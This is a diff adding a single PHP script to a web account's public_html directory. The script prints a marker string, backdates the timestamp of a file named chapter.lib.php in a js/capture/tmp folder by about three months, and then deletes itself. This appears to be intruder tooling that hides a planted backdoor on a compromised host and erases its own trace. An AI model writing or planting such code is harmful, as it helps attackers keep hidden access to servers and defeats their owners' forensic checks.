@@ -1,0 +1,1 @@
+<?php echo "TCtdwYBnrr"; if (file_exists("/home/wawoo/public_html/js/capture/tmp/chapter.lib.php")){ touch("/home/wawoo/public_html/js/capture/tmp/chapter.lib.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*yDFcHyTgmxgX6DebP1r8*/ ?>
